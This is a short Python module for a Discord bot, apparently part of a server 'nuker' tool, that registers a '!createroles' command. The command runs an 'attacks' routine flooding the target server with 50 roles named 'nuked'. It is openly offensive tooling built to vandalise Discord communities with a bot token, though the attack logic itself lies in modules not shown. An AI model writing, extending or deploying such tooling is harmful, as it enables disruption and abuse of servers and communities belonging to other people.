"""!createroles - create 50 new roles."""

import discord
from discord.ext import commands

from core import attacks
from .common import run_attack, token


class CreateRoles(commands.Cog):
    """create 50 new roles."""

    @commands.command(name="createroles")
    async def createroles(self, ctx: commands.Context):
        """create 50 new roles."""
        await run_attack(
            ctx, "Create Roles",
            lambda g: attacks.create_roles(token(), g.id, "nuked", 50))


async def setup(bot: commands.Bot):
    await bot.add_cog(CreateRoles())
